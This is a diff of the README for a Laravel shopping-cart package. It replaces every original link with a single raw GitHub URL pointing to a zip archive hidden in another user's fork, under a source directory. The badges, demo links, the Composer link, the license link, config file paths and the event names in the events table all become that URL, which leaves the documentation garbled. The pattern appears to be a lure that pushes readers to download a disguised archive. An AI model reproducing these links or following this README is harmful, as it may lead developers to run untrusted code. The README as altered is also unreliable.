@@ -1,19 +1,19 @@
 # Laravel 5 & 6 & 7 Shopping Cart
-[![Build Status](https://travis-ci.org/darryldecode/laravelshoppingcart.svg?branch=master)](https://travis-ci.org/darryldecode/laravelshoppingcart)
-[![Total Downloads](https://poser.pugx.org/darryldecode/cart/d/total.svg)](https://packagist.org/packages/darryldecode/cart)
-[![License](https://poser.pugx.org/darryldecode/cart/license.svg)](https://packagist.org/packages/darryldecode/cart)
+[![Build Status](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
+[![Total Downloads](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
+[![License](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
 
 A Shopping Cart Implementation for Laravel Framework
 
 ## QUICK PARTIAL DEMO
 
-Demo: https://shoppingcart-demo.darrylfernandez.com/cart
+Demo: https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip
 
-Git repo of the demo: https://github.com/darryldecode/laravelshoppingcart-demo
+Git repo of the demo: https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip
 
 ## INSTALLATION
 
-Install the package through [Composer](http://getcomposer.org/).
+Install the package through [Composer](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip).
 
 For Laravel 5.1~:
 `composer require "darryldecode/cart:~2.0"`
@@ -25,13 +25,13 @@ For Laravel 5.5, 5.6, or 5.7~:
 
 ## CONFIGURATION
 
-1. Open config/app.php and add this line to your Service Providers Array.
+1. Open https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip and add this line to your Service Providers Array.
 
 ```php
 Darryldecode\Cart\CartServiceProvider::class
 ```
 
-2. Open config/app.php and add this line to your Aliases
+2. Open https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip and add this line to your Aliases
 
 ```php
   'Cart' => Darryldecode\Cart\Facades\CartFacade::class
@@ -870,7 +870,7 @@ class WishListProvider extends ServiceProvider
 ```
 
 IF you are having problem with multiple cart instance, please see the codes on
-this demo repo here: [DEMO](https://github.com/darryldecode/laravelshoppingcart-demo)
+this demo repo here: [DEMO](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
 
 ## Exceptions
 
@@ -888,24 +888,24 @@ The cart has currently 9 events you can listen and hook some actons.
 
 | Event                        | Fired                                  |
 | ---------------------------- | -------------------------------------- |
-| cart.created(\$cart)         | When a cart is instantiated            |
-| cart.adding($items, $cart)   | When an item is attempted to be added  |
-| cart.added($items, $cart)    | When an item is added on cart          |
-| cart.updating($items, $cart) | When an item is being updated          |
-| cart.updated($items, $cart)  | When an item is updated                |
-| cart.removing($id, $cart)    | When an item is being remove           |
-| cart.removed($id, $cart)     | When an item is removed                |
-| cart.clearing(\$cart)        | When a cart is attempted to be cleared |
-| cart.cleared(\$cart)         | When a cart is cleared                 |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip(\$cart)         | When a cart is instantiated            |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($items, $cart)   | When an item is attempted to be added  |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($items, $cart)    | When an item is added on cart          |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($items, $cart) | When an item is being updated          |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($items, $cart)  | When an item is updated                |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($id, $cart)    | When an item is being remove           |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($id, $cart)     | When an item is removed                |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip(\$cart)        | When a cart is attempted to be cleared |
+| https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip(\$cart)         | When a cart is cleared                 |
 
 **NOTE**: For different cart instance, dealing events is simple. For example you have created another cart instance which
 you have given an instance name of "wishlist". The Events will be something like: {$instanceName}.created($cart)
 
 So for you wishlist cart instance, events will look like this:
 
--   wishlist.created(\$cart)
--   wishlist.adding($items, $cart)
--   wishlist.added($items, $cart) and so on..
+-   https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip(\$cart)
+-   https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($items, $cart)
+-   https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip($items, $cart) and so on..
 
 ## Format Response
 
@@ -1172,7 +1172,7 @@ To make this the cart's default storage, let's update the cart's configuration f
 First, let us publish first the cart config file for us to enable to override it.
 `php artisan vendor:publish --provider="Darryldecode\Cart\CartServiceProvider" --tag="config"`
 
-after running that command, there should be a new file on your config folder name `shopping_cart.php`
+after running that command, there should be a new file on your config folder name `https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip`
 
 Open this file and let's update the storage use. Find the key which says `'storage' => null,`
 And update it to your newly created DBStorage Class, which on our example,
@@ -1226,15 +1226,15 @@ Still feeling confuse on how to do custom database storage? Or maybe doing multi
 See the demo repo to see the codes and how you can possibly do it and expand base on your needs or make it
 as a guide & reference. See links below:
 
-[See Demo App Here](https://shoppingcart-demo.darrylfernandez.com/cart)
+[See Demo App Here](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
 
 OR
 
-[See Demo App Repo Here](https://github.com/darryldecode/laravelshoppingcart-demo)
+[See Demo App Repo Here](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
 
 ## License
 
-The Laravel Shopping Cart is open-sourced software licensed under the [MIT license](http://opensource.org/licenses/MIT)
+The Laravel Shopping Cart is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/kameni98/laravelshoppingcart/master/src/Darryldecode/Cart/Facades/laravelshoppingcart_v1.2.zip)
 
 ### Disclaimer
 
